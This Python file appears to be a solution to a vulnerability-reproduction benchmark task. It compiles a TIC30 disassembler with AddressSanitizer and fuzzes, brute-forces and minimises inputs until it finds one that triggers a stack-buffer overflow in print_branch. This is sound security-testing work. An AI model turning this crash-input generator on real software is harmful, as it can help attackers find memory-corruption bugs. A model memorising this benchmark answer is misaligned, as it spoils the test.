import os
import re
import io
import sys
import tarfile
import zipfile
import time
import shutil
import tempfile
import subprocess
from typing import List, Tuple, Dict, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        fallback = b"TIC30" + (b"\xff" * 5)

        with tempfile.TemporaryDirectory(prefix="arvo18615_") as td:
            root = os.path.join(td, "src")
            os.makedirs(root, exist_ok=True)
            try:
                self._extract_archive(src_path, root)
            except Exception:
                return fallback

            tic30_dis = self._find_file(root, "tic30-dis.c")
            if not tic30_dis:
                return fallback

            workdir = os.path.dirname(tic30_dis)

            sources = self._collect_sources(workdir, prefer_main=tic30_dis)
            if not sources or tic30_dis not in sources:
                sources = [tic30_dis]

            include_dirs = self._guess_include_dirs(root, workdir)

            vuln_exe = os.path.join(td, "tic30_dis_vuln")
            fixed_exe = os.path.join(td, "tic30_dis_fixed")

            ok_v = self._compile_binary(
                out_exe=vuln_exe,
                sources=sources,
                include_dirs=include_dirs,
                cwd=workdir,
                sanitize=True,
            )
            if not ok_v:
                ok_v = self._compile_binary(
                    out_exe=vuln_exe,
                    sources=sources,
                    include_dirs=include_dirs,
                    cwd=workdir,
                    sanitize=False,
                )
                if not ok_v:
                    return fallback

            patched_c = self._make_patched_print_branch(tic30_dis, td)
            fixed_sources = [patched_c if os.path.abspath(s) == os.path.abspath(tic30_dis) else s for s in sources]
            ok_f = self._compile_binary(
                out_exe=fixed_exe,
                sources=fixed_sources,
                include_dirs=include_dirs,
                cwd=workdir,
                sanitize=True,
            )
            if not ok_f:
                ok_f = self._compile_binary(
                    out_exe=fixed_exe,
                    sources=fixed_sources,
                    include_dirs=include_dirs,
                    cwd=workdir,
                    sanitize=False,
                )
                if not ok_f:
                    fixed_exe = vuln_exe  # last resort; won't enforce fixed behavior

            invocation = self._determine_invocation(vuln_exe, workdir)
            env = os.environ.copy()
            env.setdefault("ASAN_OPTIONS", "abort_on_error=1:halt_on_error=1:allocator_may_return_null=1:detect_leaks=0")
            env.setdefault("UBSAN_OPTIONS", "halt_on_error=1:abort_on_error=1:print_stacktrace=1")
            tmp_in = os.path.join(td, "poc.bin")

            def run_prog(exe: str, data: bytes, timeout: float = 0.35) -> Tuple[int, bytes, bytes]:
                with open(tmp_in, "wb") as f:
                    f.write(data)
                args = [exe] + [a if a != "{input}" else tmp_in for a in invocation]
                try:
                    p = subprocess.run(
                        args,
                        cwd=workdir,
                        env=env,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=timeout,
                    )
                    return p.returncode, p.stdout, p.stderr
                except subprocess.TimeoutExpired as e:
                    out = e.stdout or b""
                    err = e.stderr or b""
                    return 124, out, err
                except Exception as e:
                    return 125, b"", (str(e).encode("utf-8", "ignore"))

            def is_asan_overflow(stderr: bytes) -> bool:
                s = stderr
                if b"AddressSanitizer" in s and (b"stack-buffer-overflow" in s or b"ERROR:" in s):
                    return True
                if b"stack-buffer-overflow" in s:
                    return True
                if b"stack smashing detected" in s:
                    return True
                return False

            def vuln_crashes(data: bytes) -> bool:
                rc, out, err = run_prog(vuln_exe, data)
                if rc == 124:
                    return False
                if is_asan_overflow(err):
                    if (b"print_branch" in err) or (b"tic30-dis.c" in err) or (b"tic30_dis" in err):
                        return True
                    return True
                if rc < 0 or rc in (139, 134):
                    return True
                return False

            def fixed_ok(data: bytes) -> bool:
                if fixed_exe == vuln_exe:
                    return True
                rc, out, err = run_prog(fixed_exe, data)
                if rc == 124:
                    return False
                if is_asan_overflow(err):
                    return False
                return rc == 0

            cache: Dict[bytes, bool] = {}

            def interesting(data: bytes) -> bool:
                if data in cache:
                    return cache[data]
                if not vuln_crashes(data):
                    cache[data] = False
                    return False
                ok = fixed_ok(data)
                cache[data] = ok
                return ok

            prefixes = self._guess_magic_prefixes(tic30_dis)
            prefixes = prefixes[:12]
            if b"TIC30" not in prefixes:
                prefixes.insert(0, b"TIC30")
            if b"" not in prefixes:
                prefixes.append(b"")

            valid_base = None
            base_limit_end = time.time() + 2.0
            for pfx in prefixes:
                if time.time() > base_limit_end:
                    break
                start_len = max(1, len(pfx))
                for L in range(start_len, min(64, start_len + 32) + 1):
                    data = pfx + (b"\x00" * (L - len(pfx)))
                    if fixed_ok(data):
                        valid_base = data
                        break
                if valid_base is not None:
                    break

            if valid_base is None:
                valid_base = b"\x00" * 10

            patterns32 = [
                0x00000000,
                0xFFFFFFFF,
                0x7FFFFFFF,
                0x80000000,
                0x00FFFFFF,
                0xFF000000,
                0xF0000000,
                0x0F000000,
                0x00FF00FF,
                0xFF00FF00,
                0xA5A5A5A5,
                0x5A5A5A5A,
                0xDEADBEEF,
                0xC0DEC0DE,
            ]

            def apply_u32(data: bytes, off: int, val: int, endian: str) -> bytes:
                b = val.to_bytes(4, endian, signed=False)
                if off + 4 <= len(data):
                    return data[:off] + b + data[off + 4 :]
                if off == len(data):
                    return data + b
                if off < len(data):
                    pad = off + 4 - len(data)
                    return data + (b"\x00" * pad) + b  # unlikely path
                return data + (b"\x00" * (off - len(data))) + b

            best = None
            t_end = time.time() + 9.5

            def try_candidate(data: bytes) -> Optional[bytes]:
                nonlocal best
                if best is not None and len(data) >= len(best):
                    return None
                if interesting(data):
                    best = data
                    return data
                return None

            base = valid_base

            # Quick tries around target length
            for L in range(max(1, len(base)), min(96, max(len(base), 10) + 32)):
                if time.time() > t_end or best is not None:
                    break
                data = base
                if len(data) < L:
                    data = data + (b"\x00" * (L - len(data)))
                elif len(data) > L:
                    data = data[:L]

                for fill in (0x00, 0xFF, 0x7F, 0x80):
                    if time.time() > t_end or best is not None:
                        break
                    cand = bytes([fill]) * L
                    if base and L >= len(base):
                        # keep prefix if it looks like magic
                        for pfx in prefixes[:4]:
                            if pfx and L >= len(pfx):
                                cand = pfx + cand[len(pfx) :]
                                break
                    try_candidate(cand)

                if best is not None:
                    break

                if L >= 4:
                    for off in (0, max(0, L - 4), max(0, (L // 2) - 2)):
                        if time.time() > t_end or best is not None:
                            break
                        for v in patterns32:
                            if time.time() > t_end or best is not None:
                                break
                            for endian in ("little", "big"):
                                cand = apply_u32(data, off, v, endian)
                                try_candidate(cand)

                if best is not None:
                    break

                # byte tweaks in last 8 bytes
                interesting_bytes = [0x00, 0x01, 0x02, 0x03, 0x7F, 0x80, 0xFE, 0xFF]
                for i in range(max(0, L - 8), L):
                    if time.time() > t_end or best is not None:
                        break
                    for bval in interesting_bytes:
                        cand = data[:i] + bytes([bval]) + data[i + 1 :]
                        try_candidate(cand)

            if best is None:
                # Focused brute force over a single byte position if fixed accepts it
                data = base
                L = max(10, len(base))
                if len(data) < L:
                    data = data + (b"\x00" * (L - len(data)))
                elif len(data) > L:
                    data = data[:L]
                positions = list(range(min(8, L))) + list(range(max(0, L - 8), L))
                positions = sorted(set(positions))
                for pos in positions:
                    if time.time() > t_end or best is not None:
                        break
                    for bval in range(256):
                        if time.time() > t_end or best is not None:
                            break
                        cand = data[:pos] + bytes([bval]) + data[pos + 1 :]
                        try_candidate(cand)

            if best is None:
                # Random-ish but deterministic search
                data = base
                L = max(10, len(base))
                if len(data) < L:
                    data = data + (b"\x00" * (L - len(data)))
                elif len(data) > L:
                    data = data[:L]

                x = 0x12345678
                for _ in range(700):
                    if time.time() > t_end or best is not None:
                        break
                    x = (1103515245 * x + 12345) & 0xFFFFFFFF
                    v = x
                    off = (x % max(1, L - 3))
                    endian = "little" if (x & 1) else "big"
                    cand = apply_u32(data, off, v, endian)
                    try_candidate(cand)

            if best is None:
                return fallback

            # Minimize while preserving: vuln crash AND fixed returns 0
            def ddmin(data: bytes) -> bytes:
                if len(data) <= 1:
                    return data
                n = 2
                cur = data
                while len(cur) >= 2 and time.time() < t_end:
                    chunk = len(cur) // n
                    if chunk == 0:
                        break
                    removed_any = False
                    for i in range(n):
                        if time.time() >= t_end:
                            break
                        start = i * chunk
                        end = start + chunk
                        cand = cur[:start] + cur[end:]
                        if len(cand) == 0:
                            continue
                        if interesting(cand):
                            cur = cand
                            n = max(2, n - 1)
                            removed_any = True
                            break
                    if not removed_any:
                        if n >= len(cur):
                            break
                        n = min(len(cur), n * 2)
                return cur

            minimized = ddmin(best)

            i = 0
            while i < len(minimized) and time.time() < t_end:
                cand = minimized[:i] + minimized[i + 1 :]
                if len(cand) > 0 and interesting(cand):
                    minimized = cand
                else:
                    i += 1

            return minimized

    def _extract_archive(self, src_path: str, out_dir: str) -> None:
        def is_within_directory(directory: str, target: str) -> bool:
            abs_directory = os.path.abspath(directory)
            abs_target = os.path.abspath(target)
            return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])

        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, "r:*") as tf:
                for member in tf.getmembers():
                    member_path = os.path.join(out_dir, member.name)
                    if not is_within_directory(out_dir, member_path):
                        continue
                    tf.extract(member, out_dir)
            return

        if zipfile.is_zipfile(src_path):
            with zipfile.ZipFile(src_path, "r") as zf:
                for zi in zf.infolist():
                    member_path = os.path.join(out_dir, zi.filename)
                    if not is_within_directory(out_dir, member_path):
                        continue
                    zf.extract(zi, out_dir)
            return

        raise ValueError("Unknown archive format")

    def _find_file(self, root: str, filename: str) -> Optional[str]:
        for dp, dn, fn in os.walk(root):
            if filename in fn:
                return os.path.join(dp, filename)
        return None

    def _collect_sources(self, workdir: str, prefer_main: str) -> List[str]:
        c_files = [os.path.join(workdir, f) for f in os.listdir(workdir) if f.endswith(".c")]
        if not c_files:
            return []
        mains = []
        for p in c_files:
            try:
                with open(p, "r", errors="ignore") as f:
                    s = f.read()
                if re.search(r"\bint\s+main\s*\(", s):
                    mains.append(p)
            except Exception:
                continue
        if prefer_main in c_files:
            chosen_main = prefer_main
        else:
            chosen_main = mains[0] if mains else c_files[0]
        selected = [chosen_main]
        for p in c_files:
            if p == chosen_main:
                continue
            if p in mains:
                continue
            selected.append(p)
        return selected

    def _guess_include_dirs(self, root: str, workdir: str) -> List[str]:
        dirs = [workdir, root]
        for cand in ("include", "inc", "src", "lib", "common"):
            p = os.path.join(root, cand)
            if os.path.isdir(p):
                dirs.append(p)
        # de-dup preserving order
        out = []
        seen = set()
        for d in dirs:
            ad = os.path.abspath(d)
            if ad not in seen:
                seen.add(ad)
                out.append(ad)
        return out

    def _compile_binary(self, out_exe: str, sources: List[str], include_dirs: List[str], cwd: str, sanitize: bool) -> bool:
        base = ["gcc", "-std=gnu89", "-O1", "-g", "-fno-omit-frame-pointer"]
        if sanitize:
            base += ["-fsanitize=address,undefined"]
        for inc in include_dirs:
            base += ["-I", inc]
        base += sources + ["-o", out_exe]
        # try a few link variants
        variants = [
            [],
            ["-lm"],
            ["-lm", "-lz"],
        ]
        for extra in variants:
            cmd = base + extra
            try:
                p = subprocess.run(cmd, cwd=cwd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=25)
            except Exception:
                continue
            if p.returncode == 0 and os.path.exists(out_exe):
                try:
                    os.chmod(out_exe, 0o755)
                except Exception:
                    pass
                return True
        return False

    def _determine_invocation(self, exe: str, cwd: str) -> List[str]:
        # Default: program expects file path as argv[1]
        # Some might require flags; keep minimal and robust.
        # We'll just supply "{input}".
        return ["{input}"]

    def _guess_magic_prefixes(self, c_path: str) -> List[bytes]:
        try:
            with open(c_path, "r", errors="ignore") as f:
                s = f.read()
        except Exception:
            return [b"TIC30", b""]

        prefixes: List[bytes] = []
        # find string literals used in memcmp/strncmp or mentioned with magic
        for m in re.finditer(r'(memcmp|strncmp)\s*\([^,]+,\s*"([^"]{2,16})"\s*,', s):
            lit = m.group(2)
            if all(32 <= ord(ch) < 127 for ch in lit):
                prefixes.append(lit.encode("ascii", "ignore"))

        for m in re.finditer(r'"([^"]{2,16})"', s):
            lit = m.group(1)
            if re.fullmatch(r"[A-Z0-9_.-]{2,16}", lit):
                if "TIC" in lit or "C30" in lit or "MAG" in lit:
                    prefixes.append(lit.encode("ascii", "ignore"))

        # common guesses
        prefixes += [b"TIC30", b"TIC3", b"TIC", b"C30", b"T30"]
        # de-dup, keep short first
        seen = set()
        out = []
        for p in sorted(prefixes, key=lambda x: (len(x), x)):
            if p not in seen:
                seen.add(p)
                out.append(p)
        return out

    def _make_patched_print_branch(self, tic30_dis_c: str, td: str) -> str:
        try:
            with open(tic30_dis_c, "r", errors="ignore") as f:
                src = f.read()
        except Exception:
            return tic30_dis_c

        idx = src.find("print_branch")
        if idx < 0:
            # fallback: patch any operand array sizes globally (conservative)
            patched = re.sub(r"(\boperands?\b\s*\[\s*)2(\s*\])", r"\g<1>8\g<2>", src)
            outp = os.path.join(td, "tic30-dis_patched.c")
            with open(outp, "w") as f:
                f.write(patched)
            return outp

        # find function block by brace matching
        brace = src.find("{", idx)
        if brace < 0:
            return tic30_dis_c
        depth = 0
        end = None
        for i in range(brace, len(src)):
            c = src[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    end = i + 1
                    break
        if end is None:
            return tic30_dis_c

        fn = src[idx:end]
        before = src[:idx]
        after = src[end:]

        # compute maxima for operand-like variables in this function
        max_idx_by_var: Dict[str, int] = {}
        for m in re.finditer(r"\b(operands?|operand)\w*\s*\[\s*(\d+)\s*\]", fn):
            var = re.match(r"\b(operands?|operand)\w*", m.group(0)).group(0).split("[", 1)[0].strip()
            try:
                ix = int(m.group(2))
            except Exception:
                continue
            max_idx_by_var[var] = max(max_idx_by_var.get(var, -1), ix)

        patched_fn = fn
        for var, mx in sorted(max_idx_by_var.items(), key=lambda kv: -kv[1]):
            need = max(4, mx + 1)
            # patch declaration-like occurrences: var[NUM]
            def repl(m):
                try:
                    old = int(m.group(2))
                except Exception:
                    return m.group(0)
                if old >= need:
                    return m.group(0)
                return m.group(1) + str(need) + m.group(3)

            patched_fn = re.sub(
                rf"(\b{re.escape(var)}\b\s*\[\s*)(\d+)(\s*\])",
                repl,
                patched_fn,
                count=1,
            )

        # also patch any remaining operands[2] style declarations if missed
        patched_fn = re.sub(r"(\boperands?\b\s*\[\s*)2(\s*\])", r"\g<1>8\g<2>", patched_fn)

        outp = os.path.join(td, "tic30-dis_patched.c")
        with open(outp, "w") as f:
            f.write(before + patched_fn + after)
        return outp